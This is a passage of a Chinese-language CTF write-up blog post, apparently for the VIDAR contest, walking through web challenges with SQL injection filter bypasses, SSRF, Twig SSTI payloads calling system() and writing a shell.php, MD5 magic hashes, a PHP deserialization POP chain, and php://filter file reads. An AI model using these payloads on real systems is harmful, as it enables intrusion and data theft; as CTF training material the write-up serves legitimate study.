+<li>终于，大小写随意组合可以过，查出有 3 列</li>
+<li>下一步，联合注入，猜测还有过滤<br>
+<img src="sql_28.png" alt="sql 28"></li>
+<li>果然，尝试上面的方法继续绕过（发现 union select database() 都存在过滤，不放图了</li>
+<li>因为存在 <code>--</code> 过滤，所以 union 左侧 <code>-1</code> 不能用了，改为 <code>0</code><br>
+<img src="sql_29.png" alt="sql 29"></li>
+<li>成功绕过，得到数据库名</li>
+</ol>
+<blockquote>
+<p>0’UNIon%20seLect%201,daTAbase(),3%23%20<br>
+<img src="sql_210.png" alt="sql 210"></p>
+</blockquote>
+<ol start="11">
+<li>获取表名</li>
+</ol>
+<blockquote>
+<p>0’%20UNIon%20SElect%201,(sELEct%20group_concat(table_name)FrOm%20INFOrMATion_SCHEma.tables),3%23<br>
+<img src="sql_211.png" alt="sql 211"></p>
+</blockquote>
+<ol start="12">
+<li>发现 secret 表，继续获取所有字段</li>
+</ol>
+<blockquote>
+<p>0’%20UNIon%20SElect%201,group_concat(COlUmn_naME),3%20FRom%<br>
+20inFoRmAtion_sCHEma.coLUmns%20WHEre%20COlUmn_naMe%20lIkE%20’fllllllllllllllllllllllaaa444g’%23<br>
+<img src="sql_212.png" alt="sql 212"></p>
+</blockquote>
+<ol start="13">
+<li>发现 <code>0fllllllllllllllllllllllaaa444g</code>，获取字段值</li>
+</ol>
+<blockquote>
+<p>0’%20UNIon%20SElect%201,fllllllllllllllllllllllaaa444g,3%20FRom%20seeeeeeeeeeeeeeeecrret%23%20<br>
+<img src="sql_213.png" alt="sql 213"></p>
+</blockquote>
+<ol start="14">
+<li>得到 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{U*Re4lly^Kn0wn_Sql$Inject1on}</p>
+</blockquote>
+<h2 id="Concat-To-Intranet">Concat To Intranet</h2>
+<h3 id="题目描述-12">题目描述</h3>
+<p>There is a service that is not open to the outside world running on the intranet, but it seems that there is a vulnerability to access the intranet service?</p>
+<h3 id="题解-12">题解</h3>
+<ol>
+<li>打开网页，发现有一些参数可以利用，先全部尝试一下<br>
+<img src="internet_1.png" alt="internet 1"></li>
+<li>尝试 <code>/</code><br>
+<img src="internet_2.png" alt="internet 2"></li>
+<li>尝试 <code>/private2</code><br>
+<img src="internet_3.png" alt="internet 3"></li>
+<li>发现页面中出现了 <code>flag</code> 字样，但同时，发现 <code>private2port</code> 变为了 10011</li>
+<li>尝试访问 <code>/flag</code><br>
+<img src="internet_4.png" alt="internet 4"></li>
+<li>无意中访问了 <code>flag</code>，发现似乎可以拼接网址，尝试修改端口号<br>
+<img src="internet_5.png" alt="internet 5"><br>
+<img src="internet_6.png" alt="internet 6"></li>
+<li>访问 <code>1/flag</code>，成功<br>
+<img src="internet_7.png" alt="internet 7"></li>
+<li>得 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{ssrf_1s_s0^fun!!}</p>
+</blockquote>
+<h2 id="Security-Center">Security Center</h2>
+<h3 id="题目描述-13">题目描述</h3>
+<p>Thousands of roads, safety first.</p>
+<h3 id="题解-13">题解</h3>
+<ol>
+<li>打开网页，就两个跳转按钮<br>
+<img src="center_1.png" alt="center 1"></li>
+<li>尝试一下，也不知道要干啥<br>
+<img src="center_2.png" alt="center 2"><br>
+<img src="center_3.png" alt="center 3"></li>
+<li>看看源代码，发现 hint<br>
+<img src="center_4.png" alt="center 4"></li>
+<li>跳转至 json 页面，发现是对于第三方模块的使用<br>
+<img src="center_5.png" alt="center 5"></li>
+<li>在其中发现了一个模块 <code>twig</code>，经过上网查询之后，发现改题目应该与 <code>ssti</code> 有关<br>
+<img src="center_6.png" alt="center 6"><br>
+<img src="ssti.png" alt="ssti"></li>
+<li>尝试该漏洞能否利用，通过 <code>redirect.php?url=</code> 测试 <code>&#123;&#123;7-5&#125;&#125;</code><br>
+<img src="center_7.png" alt="center 7"></li>
+<li>尝试通用 payload</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>将 <code>id</code> 修改为像执行的命令，读取最顶级目录<br>
+<img src="center_8.png" alt="center 8"></li>
+<li>发现 flag 字样，尝试 cat 读取<br>
+<img src="center_9.png" alt="center 9"></li>
+<li>发现 cat 似乎被过滤了，改用 tac<br>
+<img src="center_10.png" alt="center 10"></li>
+<li>还是不行，发现存在 <code>preg_match('/VIDAR/i', $text)</code> 正则匹配，尝试通过只读取 flag 内部信息绕过匹配<br>
+<img src="center_11.png" alt="center 11"></li>
+<li>成功，得 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{U^K0nw_Tw1t&amp;SSTii1iiii11111~!}</p>
+</blockquote>
+<h2 id="My-Notebook">My Notebook</h2>
+<h3 id="题目描述-14">题目描述</h3>
+<p>I have created my notebook which was powered by the best language in the world!!!</p>
+<h3 id="题解-14">题解</h3>
+<ol>
+<li>打开一个登录界面，随便登一下<br>
+<img src="notebook_1.png" alt="noteboook 1"><br>
+<img src="notebook_2.png" alt="noteboook 2"></li>
+<li>嘶，还有要求，麻烦，直接 F12</li>
+<li>一个 Hint，下载文件<br>
+<img src="notebook_3.png" alt="noteboook 3"></li>
+<li>解压，得到源代码<br>
+<img src="notebook_4.png" alt="notebook 4"></li>
+<li>挨个查看，发现重要信息<br>
+<img src="notebook_5.png" alt="notebook 5"></li>
+<li>根据代码，得到一下判断条件</li>
+</ol>
+<blockquote>
+<p>两个值不能相等<br>
+不能为空<br>
+两个值的 MD5 要相等</p>
+</blockquote>
+<ol start="7">
+<li>思路明显，找两个 MD5 值为 0e 开头的（php 会将 0e 之后的内容判定为科学计数法</li>
+</ol>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0</span>e072485820392773389<span class="number">523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>挑两个不一样的提交上去<br>
+<img src="notebook_6.png" alt="noteboook 6"></li>
+<li>又不知道该干啥了，看源代码发现一段代码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_serialized</span>(<span class="params"><span class="variable">$data</span></span>):<span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = trim(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;N;&#x27;</span> == <span class="variable">$data</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^([adObis]):/&#x27;</span>,<span class="variable">$data</span>,<span class="variable">$options</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$options</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(preg_match( <span class="string">&quot;/^<span class="subst">$options</span>[1]:[0-9]+:.*[;&#125;]\$/s&quot;</span>, <span class="variable">$data</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^<span class="subst">$options</span>[1]:[0-9.E-]+;\$/&quot;</span>,<span class="variable">$data</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="10">
+<li>网上查询后发现这是一段用来匹配__序列化字符串__的代码，得知考察目的为构造 pop 链</li>
+<li>观察阅读 mainclass.php<br>
+<img src="notebook_7.png" alt="notebook 7"></li>
+<li>分析</li>
+</ol>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">GoGoGo</span>() &#123;&#125; 中存在 __call()，它将会在调用不可调用的函数时被调用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Evil</span>() &#123;&#125; 中存在 __get()，它将会在调用不可调用的变量时被调用</span></span><br><span class="line"><span class="class">发现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">HereWeGo</span>() &#123;&#125; 中 __destruct()，中调用了不存在的 gogogo()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">GoGoGo</span>() &#123;&#125; 中 __call()，中调用了不存在的变量 web</span></span><br></pre></td></tr></table></figure>
+<ol start="13">
+<li>构造 payload()</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use HereWeGo as GlobalHereWeGo;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use Evil as GlobalEvil;</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HereWeGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;try-&gt;gogogo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoGoGo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$go</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;go = <span class="variable">$go</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;go-&gt;web;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$final</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//The flag is in /flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/vidar/i&#x27;</span>,<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;final = <span class="string">&quot;HACKER!!!&quot;</span>;</span><br><span class="line">            file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="keyword">$this</span>-&gt;final);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;final = <span class="variable">$result</span>;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="keyword">$this</span>-&gt;final);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Evil(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> GoGoGo(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> HereWeGo();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">try</span> = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<ol start="14">
+<li>运行 payload 得，并提交</li>
+</ol>
+<blockquote>
+<p>O:8:“HereWeGo”:1:{s:3:“try”;O:6:“GoGoGo”:1:{s:2:“go”;O:4:“Evil”:2:{s:4:“file”;s:5:“/flag”;s:5:“final”;N;}}}<br>
+<img src="notebook_8.png" alt="notebook 8"></p>
+</blockquote>
+<ol start="15">
+<li>由下载的源代码中可以知道结果被写入 flag.txt，尝试访问<br>
+<img src="notebook_9.png" alt="notebook 9"></li>
+<li>嘶，不对，再次阅读源码，发现存在 preg_match(‘/vidar/i’, $result)，读取的内容存在 vidar 字样，需要绕过，使用 php 伪协议读取 base64</li>
+</ol>
+<blockquote>
+<p>php://filter/read=convert.base64-encode/resource=/flag</p>
+</blockquote>
+<ol start="17">
+<li>修改 payload</li>
+</ol>
+<blockquote>
+<p><s>$c = new Evil(‘/flag’);</s><br>
+$c = new Evil(‘php://filter/read=convert.base64-encode/resource=/flag’);</p>
+</blockquote>
+<ol start="18">
+<li>重新运行 payload</li>
+</ol>
+<blockquote>
+<p>O:8:“HereWeGo”:1:{s:3:“try”;O:6:“GoGoGo”:1:{s:2:“go”;O:4:“Evil”:2:{s:4:“file”;s:54:“php://filter/read=convert.base64-encode/resource=/flag”;s:5:“final”;N;}}}</p>
+</blockquote>
+<ol start="19">
+<li>重新提交，访问 flag.txt<br>
+<img src="notebook_10.png" alt="notebook 10"><br>
+<img src="notebook_11.png" alt="notebook 11"></li>
+<li>base64 解码得到 flag<br>
+<img src="notebook_12.png" alt="notebook 12"></li>
+</ol>
+<blockquote>
+<p>VIDAR{Php,BeAwAre0FUnS@vE_uNsEr1al1z5=o==o=}</p>
+</blockquote>
+<ol start="21">
+<li>sha1 碰撞</li>
+</ol>
+<blockquote>
+<p>sha1(‘aaroZmOk’)<br>
+sha1(‘aaK1STfY’)<br>
+sha1(‘aaO8zKZF’)<br>
+sha1(‘aa3OFF9m’)</p>
+</blockquote>
+<h2 id="Read-something-useful">Read something useful</h2>
+<h3 id="题目描述-15">题目描述</h3>
+<p>R1esbyfe’s emoji packs are full, so he put some of his favorite emoji packs on this website and plans to share them with his friends, he also hid a secret here, who is the first one to find the hidden secret?</p>
+<h3 id="题解-15">题解</h3>
+<ol>
+<li>访问，页面审计，发现注释<br>
+<img src="read_1.png" alt="read 1"></li>
+<li>有一个判断，file 参数中必须包括 emoji<br>
+<img src="read_2.png" alt="read 2"></li>
+<li>普通读取不行，改用 php伪协议</li>
+</ol>
+<blockquote>
+<p>php://filter/read/resource=</p>
+</blockquote>
+<ol start="4">
+<li>同时为绕过字符串包含，需要利用别的参数加入 emoji</li>
+</ol>
+<blockquote>
+<p>write=emoji</p>
+</blockquote>
+<ol start="5">
+<li>使用 read 需要 base64 编码后读取，（原因可能是因为浏览器自动翻译读取的原内容，造成死循环</li>
+<li>payload（index.php 中存在字符串拼接，所以文件名为 index</li>
+</ol>
+<blockquote>
+<p>php://filter/read=convert.base64-encode/write=emoji/resource=index</p>
+</blockquote>
+<ol start="7">
+<li>base64 解码得到的内容</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br><span class="line">--</span><br><span class="line">PGh0bWw+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICAgICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJSMWVzYnlmZSI+DQogICAgICAgIDxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJDaGFsbGVuZ2UxMCI+DQogICAgPC9oZWFkPg0KICAgICAgICA8Ym9keT4NCiAgICAgICAgPGRpdiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyIj4NCiAgICAgICAgICAgIDwhLS0gdHJ5IHRvIHJlYWQgaW5kZXgucGhwIGZpcnN0ISAtLT4NCiAgICAgICAgICAgIDxoND5UcnkgdG8gY2xpY2sgdGhlIGJ1dHRvbiB0byBlbmpveSBteSBlbW9qaSEhITwvaDQ+DQogICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPg0KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIGlkPSJmaWxlIiB2YWx1ZT0iZW1vamkiPg0KICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DbGljayBtZTwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwhLS0gWW91IG1heSBmaW5kIGl0IGlzIGEgbGl0dGxlIGRpZmZpY3VsdCB0byByZWFkIG90aGVyIGZpbGVzLCByaWdodCA6KCAtLT4NCiAgICAgICAgICAgICAgICA8IS0tIGluIGluZGV4LnBocDoNCg0KICAgICAgICAgICAgICAgICAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107DQogICAgICAgICAgICAgICAgICAgIGlmKHN0cnBvcygkZmlsZSwgImVtb2ppIikgIT09IGZhbHNlKXsNCiAgICAgICAgICAgICAgICAgICAgaW5jbHVkZSgkZmlsZS4nLnBocCcpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIC0tPg0KICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9ib2R5Pg0KPC9odG1sPg0KDQo8P3BocA0KDQovL3RyeSB0byByZWFkIGZpbmRtZS5waHAgdG8gZmluZCBteSBzZWNyZXRzIDpEDQoNCmVycm9yX3JlcG9ydGluZygwKTsNCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsNCg0KaWYoaXNzZXQoJGZpbGUpKXsNCiAgICBpZihzdHJwb3MoJGZpbGUsICJlbW9qaSIpICE9PSBmYWxzZSl7DQogICAgICAgIGluY2x1ZGUoJGZpbGUuJy5waHAnKTsNCiAgICB9ZWxzZXsNCiAgICAgICAgZWNobyAiPGNlbnRlcj5ObyxZb3UgbmVlZCB0byBmaW5kIGFub3RoZXIgd2F5IHRvIGZpbmQgbXkgc2VjcmV0IDooPC9jZW50ZXI+IjsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCn0NCj8+DQoNCg==</span><br><span class="line">--</span><br><span class="line">index.php</span><br><span class="line">--</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;R1esbyfe&quot;</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;Challenge10&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;div style=<span class="string">&quot;text-align: center&quot;</span>&gt;</span><br><span class="line">            &lt;!-- <span class="keyword">try</span> to read index.php first! --&gt;</span><br><span class="line">            &lt;h4&gt;<span class="keyword">Try</span> to click the button to enjoy my emoji!!!&lt;/h4&gt;</span><br><span class="line">            &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> value=<span class="string">&quot;emoji&quot;</span>&gt;</span><br><span class="line">                &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;Click me&lt;/button&gt;</span><br><span class="line">                &lt;!-- You may find it is a little difficult to read other files, right :( --&gt;</span><br><span class="line">                &lt;!-- in index.php:</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strpos(<span class="variable">$file</span>, <span class="string">&quot;emoji&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">              --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//try to read findme.php to find my secrets :D</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$file</span>, <span class="string">&quot;emoji&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;No,You need to find another way to find my secret :(&lt;/center&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>发现需要去读取 findme.php，同上</li>
+</ol>
